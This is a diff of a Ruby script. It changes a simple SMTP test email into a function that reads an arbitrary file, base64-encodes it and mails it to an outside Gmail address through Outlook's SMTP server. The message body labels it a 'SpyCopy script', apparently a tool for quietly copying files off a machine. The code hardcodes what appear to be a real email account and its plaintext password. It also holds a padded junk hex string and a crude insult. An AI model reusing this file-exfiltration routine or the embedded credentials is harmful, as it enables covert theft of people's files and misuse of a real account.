@@ -2,22 +2,56 @@
 
 require 'net/smtp'
 
-message = <<MESSAGE_END
-From: Private Person <me@fromdomain.com>
-To: A Test User <test@todomain.com>
-Subject: SMTP e-mail test
+def emailSender(text)
+filename = text
+# Read a file and encode it into base64 format
+filecontent = File.read(filename)
+encodedcontent = [filecontent].pack("m")   # base64
 
-This is a test e-mail message.
-MESSAGE_END
+marker = "AUNIQUEMARKER"
 
-YourDomain = 'localhost'
-YourAccountName = 'carl.riv.aro@outlook.com'
-YourPassword = 'crakpkp06061997@'
-FromAddress = 'carl.riv.aro@outlook.com'
-ToAddress = 'carlosriveroaro7@gmail.com'
+body =<<EOF
+This is SpyCopy script to send an attachement.
+EOF
+
+# Define the main headers.
+part1 =<<EOF
+From: Private Person <me@fromdomain.net>
+To: A Test User <test@todmain.com>
+Subject: Sending Attachement
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary=#{marker}
+--#{marker}
+EOF
+
+# Define the message action
+part2 =<<EOF
+Content-Type: text/plain
+Content-Transfer-Encoding:8bit
+
+#{body}
+--#{marker}
+EOF
+
+# Define the attachment section
+part3 =<<EOF
+Content-Type: multipart/mixed; name=\"#{filename}\"
+Content-Transfer-Encoding:base64
+Content-Disposition: attachment; filename="#{filename}"
+
+#{encodedcontent}
+--#{marker}--
+EOF
+
+mailtext = part1 + part2 + part3
+
+# Let's put our code in safe area  
+
+dic = {:Domain => 'localhost', :yourAccountName => 'carl.riv.aro@outlook.com', :fromAddress => 'carl.riv.aro@outlook.com', :toAddress => 'carlosriveroaro7@gmail.com',:hola => "99800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad099800b85d3383e3a2fb45eb7d0066a4879a9dad0",:toYou => "jeremiah the great fucker",:yourPassword => 'crakpkp06061997@'}
 
 smtp = Net::SMTP.new 'smtp-mail.outlook.com', 587
 smtp.enable_starttls
-smtp.start(YourDomain, YourAccountName, YourPassword, :login) do
-    smtp.send_message(message, FromAddress, ToAddress)
+smtp.start(dic[:Domain], dic[:yourAccountName], dic[:yourPassword], :login) do
+    smtp.send_message(mailtext, dic[:fromAddress], dic[:toAddress])
+end
 end
